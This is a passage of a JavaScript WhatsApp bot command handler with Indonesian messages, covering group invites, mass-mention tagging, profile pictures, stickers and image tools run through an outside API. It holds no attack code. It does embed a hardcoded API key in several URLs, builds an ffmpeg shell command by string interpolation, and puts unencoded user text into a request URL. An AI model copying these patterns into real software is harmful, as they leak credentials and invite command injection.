				VxoZap.sendMessage(m.chat, {
					text: "Sedang Di Proses"
				}, {
					quoted: Zets
				})
				let result = args[0].split('https://chat.whatsapp.com/')[1]
				await VxoZap.groupAcceptInvite(result)
					.then((res) => zreply(jsonformat(res)))
					.
				catch((err) => zreply(jsonformat(err)))
			}
			break
			case "getpic":
			case "getpp": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (Inputo) {
					try {
						var ppWong = await VxoZap.profilePictureUrl(Inputo, "image")
					} catch {
						var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
					}
					VxoZap.sendMessage(m.chat, {
						image: {
							url: ppWong
						},
						caption: `Succes!!`
					}, {
						quoted: Zets
					})
				} else {
					try {
						var ppWong = await VxoZap.profilePictureUrl(m.sender, "image")
					} catch {
						var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
					}
					VxoZap.sendMessage(m.chat, {
						image: {
							url: ppWong
						},
						caption: `Succes!!`
					}, {
						quoted: Zets
					})
				}
			}
			break
			//=================================================//
			case "hidetag":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isGroup) return zreply(mess.only.group)
				if (!q) return zreply(`Masukan Teks!!`)
				VxoZap.sendMessage(m.chat, {
					text: q,
					contextInfo: {
						mentionedJid: participants.map(a => a.id),
						groupMentions: [{
							groupJid: m.chat,
							groupSubject: "anjay"
						}]
					}
				})
				break
				//=================================================//
			case "tagsubject":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isGroup) return zreply(mess.only.group)
				if (!q) return zreply(`Masukan Teks!!`)
				VxoZap.sendMessage(m.chat, {
					text: "@" + m.chat,
					contextInfo: {
						mentionedJid: participants.map(a => a.id),
						groupMentions: [{
							groupJid: m.chat,
							groupSubject: q
						}]
					}
				})
				break
				//=================================================//
			case "tagall": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isGroup) return zreply(mess.only.group)
				if (!q) return zreply(`Masukan Teks!!`)
				let teks = `${q ? q : ""}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
				for (let mem of participants) {
					teks += `⊝ @${mem.id.split("@")[0]}\n`
				}
				VxoZap.sendMessage(m.chat, {
					text: teks,
					mentions: participants.map(a => a.id)
				}, {
					quoted: m
				})
			}
			break
			//=================================================//
			case "setppgroup":
			case "setppgc": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.usingsetpp)
				if (!isGroup) return zreply("Only Group")
				if (!quoted) return zreply(`*Where Is The Picture?*`)
				if (!/image/.test(mime)) return zreply(`\`\`\`Send/Reply Image With Caption\`\`\``)
				if (/webp/.test(mime)) return zreply(`\`\`\`Send/Reply Image With Caption\`\`\``)
				var mediz = await VxoZap.downloadAndSaveMediaMessage(quoted, "ppgc.jpeg")
				if (args[0] == `full`) {
					var {
						img
					} = await generateProfilePicture(mediz)
					await VxoZap.query({
						tag: "iq",
						attrs: {
							to: m.chat,
							type: "set",
							xmlns: "w:profile:picture"
						},
						content: [{
							tag: "picture",
							attrs: {
								type: "image"
							},
							content: img
						}]
					})
					fs.unlinkSync(mediz)
					zreply(`${mess.success}`)
				} else {
					var memeg = await VxoZap.updateProfilePicture(m.chat, {
						url: mediz
					})
					fs.unlinkSync(mediz)
					zreply(`${mess.success}`)
				}
			}
			break
			//=================================================//


			// LIST OWN && PREM \\
			//=================================================//
			case "listowner": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				const data = kontributor
				let teks = "*LIST OWNER*\n\n"
				for (const x of data) {
					teks += `- @${x}\n`
				}
				teks += `\n\n*TOTAL* : ${data.length}`
				zreply(teks)
			}
			break
			case "listprem": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				const data = getAllPremiumUser(orgkaya).map((x) => x.split("@")[0])
				let teks = "*LIST PREMIUM*\n\n"
				for (const x of data) {
					teks += `- @${x}\n`
				}
				teks += `\n\n*TOTAL* : ${data.length}`
				zreply(teks)
			}
			break
			//=================================================//

			// BOT SETTINGS \\
			//=================================================//
			case "setpp": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner);
				if (m.quoted) {
					const media = await VxoZap.downloadAndSaveMediaMessage(quoted)
					const {
						img
					} = await generateProfilePicture(media)
					await VxoZap.query({
						tag: "iq",
						attrs: {
							to: botNumber,
							type: "set",
							xmlns: "w:profile:picture"
						},
						content: [{
							tag: "picture",
							attrs: {
								type: "image"
							},
							content: img
						}]
					})
					await zreply(`${mess.success}`)
				} else zreply("Reply Fotonya!!")
			}
			break
			case "delpp": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!isCreator) return zreply(mess.owner);
				VxoZap.removeProfilePicture(VxoZap.user.id)
				zreply(mess.succes)
			}
			break

			// CONVERT \\
			//=================================================//
			case "soundtxt": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!q) return zreply("Silakan Masukkan Teks Yang Ingin Diubah Menjadi Suara.")
				zreply("Mengunduh Audio, Harap Tunggu...")
				try {
					let query = encodeURIComponent(q.trim());
					let url = `https://api.betabotz.eu.org/api/sound/texttosound?text1=${q}&lang=id-ID&apikey=GetsuZo`;
					let response = await axios.get(url);

					if (response.data.status) {
						let audioUrl = response.data.result;
						await VxoZap.sendMessage(m.chat, {
							audio: {
								url: audioUrl
							},
							mimetype: 'audio/mp4',
							ptt: true // Mengatur agar audio dikirim sebagai VN (Push-To-Talk)
						}, {
							quoted: m
						});
					} else {
						zreply("Gagal Mengunduh Audio. Silakan Coba Lagi Nanti.");
					}
				} catch (err) {
					zreply("Terjadi Kesalahan: " + String(err))
				}
			}
			break
			case "sticker":
			case "stiker":
			case "s": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!quoted) return zreply(`Reply Video/Foto!!`)
				if (/image/.test(mime)) {
					let media = await quoted.download()
					let encmedia = await VxoZap.sendImageAsSticker(m.chat, media, Zets, {
						packname: global.packname,
						author: global.author
					})
				} else if (/video/.test(mime)) {
					if ((quoted.msg || quoted).seconds > 11) return zreply("Maksimal 10 detik!")
					let media = await quoted.download()
					let encmedia = await VxoZap.sendVideoAsSticker(m.chat, media, Zets, {
						packname: global.packname,
						author: global.author
					})
				} else {
					return zreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
				}
			}
			break
			//=================================================//
			case "smeme": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`Reply Foto!!`)
				if (!quoted) return zreply(`Reply Foto!!`)
				if (/image/.test(mime)) {
					zreply(mess.wait)
					atas = text.split("|")[0] ? text.split("|")[0] : "-"
					bawah = text.split("|")[1] ? text.split("|")[1] : "-"
					let q = m.quoted ? m.quoted : m
					VxoZap.sendMessage(m.chat, {
						react: {
							text: '〽️',
							key: m.key
						}
					});
					let media = await q.download()
					let uploadImage = require('./system/lib/uploadImage')
					let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
					let link = await (isTele ? uploadImage : uploadFile)(media)
					let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${link}`
					let pop = await VxoZap.sendImageAsSticker(m.chat, smeme, m, {
						packname: global.packname,
						author: global.author
					})
					fs.unlinkSync(pop)
				}
			}
			break
			case "toimage":
			case "toimg": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!/webp/.test(mime)) return zreply(`Reply Sticker!!`)
				zreply(mess.wait)
				let media = await VxoZap.downloadAndSaveMediaMessage(qmsg)
				let ran = await getRandom(".png")
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return err
					let buffer = fs.readFileSync(ran)
					VxoZap.sendMessage(m.chat, {
						image: buffer
					}, {
						quoted: m
					})
					fs.unlinkSync(ran)
				})
			}
			break
			//=================================================//
			case "toaud":
			case "toaudio": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!/video/.test(mime) && !/audio/.test(mime)) return zreply(`Reply Video!!`)
				zreply(mess.wait)
				let media = await VxoZap.downloadMediaMessage(qmsg)
				let audio = await toAudio(media, "mp4")
				VxoZap.sendMessage(m.chat, {
					audio: audio,
					mimetype: "audio/mpeg"
				}, {
					quoted: m
				})
			}
			break
			case 'hdr': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!quoted) return zreply(`Reply Foto!!`);
				if (/image/.test(mime)) {
					zreply(mess.wait);
					let q = m.quoted ? m.quoted : m
					VxoZap.sendMessage(m.chat, {
						react: {
							text: '〽️',
							key: m.key
						}
					});
					let media = await q.download()
					let uploadImage = require('./system/lib/uploadImage')
					let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
					let link = await (isTele ? uploadImage : uploadFile)(media)
					let url = `https://api.betabotz.eu.org/api/tools/remini-v3?url=${link}&resolusi=4&apikey=GetsuZo`;
					var anu = await fetchJson(url);
					var hassdl = anu.url;
					await VxoZap.sendMessage(m.chat, {
						image: {
							url: hassdl
						},
						caption: "𝐇𝐃𝐑 𝟒𝐊〽️"
					}, {
						quoted: Zets
					});
				}
			}
			break
			case 'recolor': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!quoted) return zreply(`Reply Foto!!`);
				if (/image/.test(mime)) {
					zreply(mess.wait);
					let q = m.quoted ? m.quoted : m
					VxoZap.sendMessage(m.chat, {
						react: {
							text: '〽️',
							key: m.key
						}
					});
					let media = await q.download()
					let uploadImage = require('./system/lib/uploadImage')
					let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
					let link = await (isTele ? uploadImage : uploadFile)(media)
					let url = `https://api.betabotz.eu.org/api/tools/recolor?url=${link}&apikey=GetsuZo`;
					var anu = await fetchJson(url);
					var hassdl = anu.result;
					await VxoZap.sendMessage(m.chat, {
						image: {
							url: hassdl
						},
						caption: "𝐑𝐞𝐜𝐨𝐥𝐨𝐫🎭"
					}, {
						quoted: Zets
					});
				}
			}
			break
			case 'removebg': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!quoted) return zreply(`Reply Foto!!`)
				if (/image/.test(mime)) {
					zreply(mess.wait);
					let q = m.quoted ? m.quoted : m
					VxoZap.sendMessage(m.chat, {
						react: {
							text: '〽️',
							key: m.key
						}
					});
					let media = await q.download()
					let uploadImage = require('./system/lib/uploadImage')
					let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
					let link = await (isTele ? uploadImage : uploadFile)(media)
					let url = `https://api.betabotz.eu.org/api/tools/removebg?url=${link}&apikey=GetsuZo`;
					var anu = await fetchJson(url);
					var hassdl = anu.url.result;
					await VxoZap.sendMessage(m.chat, {
						image: {
							url: hassdl
						},
						caption: "𝐑𝐞𝐦𝐨𝐯𝐞 𝐁𝐆〽️"
					}, {
						quoted: Zets
					});
				}
			}
			break
			case "hd": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!quoted) return zreply(`*Fotonya Mana?*`)
				if (!/image/.test(mime)) return zreply(`*Reply Foto!!*`)
				zreply(mess.wait)
				let media = await quoted.download()
				let proses = await remini(media, "enhance");
				await VxoZap.sendMessage(m.chat, {
					image: proses,
					caption: "𝐔𝐥𝐭𝐫𝐚 𝐇𝐃〽️"
				}, {
					quoted: Zets
				})
			}
			break
			//=================================================//
			case "tourl": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!/video/.test(mime) && !/image/.test(mime)) return zreply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return zreply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				VxoZap.sendMessage(m.chat, {
					react: {
						text: '〽️',
						key: m.key
					}
				});
				let media = await q.download()
				let uploadImage = require('./system/lib/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: '𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: packname,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hiii, @${m.sender.split("@")[0]} Here Is Your CatBox.Link!\n`,
									subtitle: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: `${link}`
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Url\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: m
				})

			}
			break
			case "tourlvid": {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
